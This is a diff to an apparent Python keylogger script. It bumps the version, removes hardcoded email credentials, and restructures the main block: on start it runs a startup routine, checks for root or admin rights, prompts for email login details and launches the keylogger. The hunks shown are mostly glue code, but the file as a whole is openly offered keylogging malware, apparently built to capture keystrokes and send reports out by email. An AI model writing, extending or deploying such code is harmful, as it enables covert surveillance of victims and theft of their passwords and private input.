@@ -20,7 +20,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 # Version
-_version = "0.0.1"
+_version = "1.0.0"
 
 # Colors
 _black = "\033[0;30m"
@@ -70,8 +70,6 @@ def check_admin():
 
 # Global Variables
 send_report = 60
-email_address = 'email@provider.ltd'
-email_password = 'password123'
 
 # Main Programm
 class KeyLogger:
@@ -164,13 +162,20 @@ class KeyLogger:
 
 if __name__ == '__main__':
     startup()
-    if os.name == 'posix':
-        check_root()
-        keylogger = KeyLogger(interval = send_report, report_method = 'file')
-        keylogger.start()
-    elif os.name == 'nt':
-        check_admin()
-        keylogger = KeyLogger(interval = send_report, report_method = 'file')
-        keylogger.start()
-    else: 
+    try:
+        if os.name == 'posix':
+            check_root()
+            email_address = str(input(f"Enter the {_yellow}email{_white}: "))
+            email_password = str(input(f"Enter the {_green}password{_white} of email: "))
+            keylogger = KeyLogger(interval = send_report, report_method = 'file')
+            keylogger.start()
+        elif os.name == 'nt':
+            check_admin()
+            keylogger = KeyLogger(interval = send_report, report_method = 'file')
+            keylogger.start()
+        else: 
+            sys.exit(1)
+    
+    except KeyboardInterrupt:
+        print(f"{_red}[-]{_white} Program {_red}end{_white} by user!")
         sys.exit(1)
